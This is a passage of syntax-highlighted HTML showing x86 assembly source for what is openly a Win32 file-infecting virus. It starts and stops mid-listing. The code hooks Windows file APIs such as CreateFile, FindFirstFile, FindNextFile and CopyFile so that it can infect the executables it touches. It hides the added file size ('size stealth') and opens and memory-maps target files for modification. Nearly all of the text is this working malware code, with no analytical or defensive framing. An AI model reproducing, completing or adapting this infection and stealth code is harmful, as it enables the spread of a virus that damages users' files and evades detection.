        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewFindNextFileA</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewFindNextFileW</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewSetFileAttrA</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">NewSetFileAttrW</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">jmp_table_size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">        </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">jmp_addr_table</span><span class="sc0">

</span><span class="sc5">NewSetFileAttrW</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;new API handlerz (unicode version)..</span><span class="sc0">
</span><span class="sc5">NewCreateFileW</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewCreateProcessW</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewMoveFileW</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewCopyFileW</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewMoveFileExW</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewGetFileAttrW</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CommonProcessW</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">    </span><span class="sc1">;clear carry (unicode version)</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">NewSetFileAttrA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;new API handlerz (ansi version)..</span><span class="sc0">
</span><span class="sc5">NewCreateFileA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewCreateProcessA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewMoveFileA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewOpenFile</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewCopyFileA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">New_lopen</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewMoveFileExA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NewGetFileAttrA</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CommonProcessA</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">             </span><span class="sc1">;set carry (ansi version)</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_ebp2_Uni2Ansi</span><span class="sc0">       </span><span class="sc1">;get EBP to reference internal variablez correctly and convert unicode string to ansi (for unicode version APIz)</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">jmp_old_api</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">findfirst</span><span class="sc0">               </span><span class="sc1">;get atributez, size of file and check if it exists</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">jmp_old_api</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;save search handle</span><span class="sc0">
        </span><span class="sc5">@copysz</span><span class="sc0">                         </span><span class="sc1">;copy filename to an internal buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Process_File2</span><span class="sc0">           </span><span class="sc1">;try to infect file..</span><span class="sc0">

</span><span class="sc5">NCF_close</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindClose</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;close file search</span><span class="sc0">

</span><span class="sc5">jmp_old_api</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;jump to original API adress</span><span class="sc0">

</span><span class="sc5">NewFindFirstFileW</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;new findfirst API handler.. infect files, stealth (unicode version)</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">;clear carry (unicode version)</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">NewFindFirstFileA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;new findfirst API handler.. infect files, stealth (ansi version)</span><span class="sc0">

                </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">;set carry (ansi version)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">APICall@n_2</span><span class="sc0">     </span><span class="sc1">;call old findfirst API</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;if any error, get out</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_ebp2_Uni2Ansi</span><span class="sc0">       </span><span class="sc1">;get EBP to reference internal variablez correctly and convert unicode string to ansi (for unicode version APIz)</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pPathNamez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get pointer to new entry in pathnamez table</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PathNamez</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">nPATHNAMEZ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get top of pathnamez table</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">    </span><span class="sc1">;if not enough space to store filename, jump</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc5">@copysz</span><span class="sc0">                 </span><span class="sc1">;copy filename to pathnamez table</span><span class="sc0">
</span><span class="sc5">next2_ff</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get end of path..</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,-</span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">eop_ff</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">eop_ff</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">next2_ff</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">eop_ff</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;force null to split path from filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pPathNamez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;update pointer to next entry in pathnamez table</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_handle_ofs_0</span><span class="sc0">        </span><span class="sc1">;get new free entry in handlez table</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get handle returned by findfirst</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;store handle into handlez table</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">                           </span><span class="sc1">;store pointer to asociated pathname into handlez table as well</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pHandlez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">  </span><span class="sc1">;update pointer to next entry in handlez table</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FindCommon</span><span class="sc0">

</span><span class="sc5">go_ret_2Pshd</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;return to caller</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">NewFindNextFileW</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;new findnext API handler.. infect files, stealth (unicode version)</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">            </span><span class="sc1">;clear carry (unicode version)</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">NewFindNextFileA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;new findnextt API handler.. infect files, stealth (ansi version)</span><span class="sc0">

                </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">;set carry (ansi version)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">APICall@n_2</span><span class="sc0">     </span><span class="sc1">;call old findnext API</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_handle_ofs_ebp</span><span class="sc0">      </span><span class="sc1">;get correct entry in handlez table acordin to handle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get respective pathname</span><span class="sc0">

</span><span class="sc5">FindCommon</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PathName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">@copysz</span><span class="sc0">                 </span><span class="sc1">;copy pathname to respective buffer</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">esp.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get WIN32_FIND_DATA parameter</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">uni_or_ansi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;check if its ansi or unicode</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get filename</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">its_ansi_fc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Uni2Ansi</span><span class="sc0">        </span><span class="sc1">;its unicode, convert to ansi and atach filename to pathname</span><span class="sc0">
</span><span class="sc5">its_ansi_fc</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Process_File3</span><span class="sc0">   </span><span class="sc1">;try to infect file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_size</span><span class="sc0">        </span><span class="sc1">;get file size</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeLow.hiw.hib</span><span class="sc4">],</span><span class="sc2">11111100b</span><span class="sc0">  </span><span class="sc1">;filesize &gt; 64MB?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">    </span><span class="sc1">;yea, file too large, jump</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jns</span><span class="sc0">     </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">    </span><span class="sc1">;if not infected, jump, stealth not necesary</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_PE_file</span><span class="sc0">   </span><span class="sc1">;file is infected, do size stealth</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">go_ret_2Pshd</span><span class="sc0">

</span><span class="sc5">NewFindCloseX</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">APICall@n</span><span class="sc0">       </span><span class="sc1">;call old findclose API</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_handle_ofs_ebp</span><span class="sc0">      </span><span class="sc1">;get correct entry in handlez table acordin to handle</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">go_ret_Pshd</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pHandlez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;remove pathname entry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pPathNamez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc5">@endsz</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ebx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pPathNamez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;update pointer to handlez table</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                                   </span><span class="sc1">;remove handle entry</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">setH_fc</span><span class="sc0">
</span><span class="sc5">FixpPathNamez</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">movsd</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">FixpPathNamez</span><span class="sc0">
</span><span class="sc5">setH_fc</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pHandlez</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">          </span><span class="sc1">;update pointer to pathnamez table</span><span class="sc0">
</span><span class="sc5">go_ret_Pshd</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;open and map file in read only mode</span><span class="sc0">
                        </span><span class="sc1">;  on entry:</span><span class="sc0">
                        </span><span class="sc1">;    ESI = pszFileName (pointer to file name)</span><span class="sc0">
                        </span><span class="sc1">;  on exit:</span><span class="sc0">
                        </span><span class="sc1">;    ECX = 0, if error</span><span class="sc0">
                        </span><span class="sc1">;    ECX = base adress of memory-maped file, if ok</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFileAdj</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc1">;open and map file in read/write mode</span><span class="sc0">
                        </span><span class="sc1">;  on entry:</span><span class="sc0">
                        </span><span class="sc1">;    EDI = file size + work space (in bytes)</span><span class="sc0">
                        </span><span class="sc1">;    ESI = pszFileName (pointer to file name)</span><span class="sc0">
                        </span><span class="sc1">;  on exit:</span><span class="sc0">
                        </span><span class="sc1">;    ECX = 0, if error</span><span class="sc0">
                        </span><span class="sc1">;    ECX = base adress of memory-maped file, if ok</span><span class="sc0">
                        </span><span class="sc1">;    EDI = old file size</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;NULL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;FILE_SHARE_READ</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;GENERIC_READ</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;GENERIC_READ + GENERIC_WRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;pszFileName</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;open file</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">        </span><span class="sc1">;if error, jump</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;push first handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;NULL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;file size + buffer size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">PAGE_READONLY</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">;PAGE_READWRITE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;NULL</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;handle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddCreateFileMappingA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;create file mapping</span><span class="sc0">
                </span><span class="sc6">cdq</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile2</span><span class="sc0">       </span><span class="sc1">;if error, close handle and jump</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;push second handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">;file size + buffer size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">;0</span><span class="sc0">
